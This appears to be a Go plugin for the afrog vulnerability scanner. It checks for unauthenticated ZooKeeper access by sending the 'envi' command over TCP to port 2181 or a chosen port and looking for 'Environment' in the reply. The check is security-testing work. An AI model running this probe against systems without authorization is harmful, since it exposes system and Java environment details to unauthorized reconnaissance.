package gopoc

import (
	"bytes"
	"errors"

	"github.com/zan8in/afrog/pkg/poc"
	"github.com/zan8in/afrog/pkg/proto"
	"github.com/zan8in/afrog/pkg/utils"
)

var (
	zookeeperPort       = "2181"
	zookeeperUnAuthName = "zookeeper-unauth"
)

func zookeeperUnAuth(args *GoPocArgs) (Result, error) {
	poc := poc.Poc{
		Id: zookeeperUnAuthName,
		Info: poc.Info{
			Name:        "ZooKeeper 未授权访问",
			Author:      "zan8in",
			Severity:    "high",
			Description: "ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。",
			Reference: []string{
				"http://wiki.peiqi.tech/redteam/vulnerability/unauthorized/Zookeeper%202181%E7%AB%AF%E5%8F%A3.html",
			},
		},
	}
	args.SetPocInfo(poc)
	result := Result{Gpa: args, IsVul: false}

	if len(args.Host) == 0 {
		return result, errors.New("no host")
	}

	if len(args.Port) > 0 && args.Port != "80" && args.Port != "443" {
		addr := args.Host + ":" + args.Port
		payload := []byte("envidddfdsfsafafaerwrwerqwe")

		resp, err := utils.Tcp(addr, payload)
		if err != nil {
			return result, err
		}

		if bytes.Contains(resp, []byte("Environment")) {
			result.IsVul = true
			url := proto.UrlType{Host: addr, Port: args.Port}
			result.SetAllPocResult(true, &url, payload, resp)
			return result, nil
		}
	}

	addr := args.Host + ":" + zookeeperPort
	payload := []byte("envidddfdsfsafafaerwrwerqwe")

	resp, err := utils.Tcp(addr, payload)
	if err != nil {
		return result, err
	}

	if bytes.Contains(resp, []byte("Environment")) {
		result.IsVul = true
		url := proto.UrlType{Host: addr, Port: zookeeperPort}
		result.SetAllPocResult(true, &url, payload, resp)
		return result, nil
	}

	return result, errors.New("check result: no vul")
}

func init() {
	GoPocRegister(zookeeperUnAuthName, zookeeperUnAuth)
}
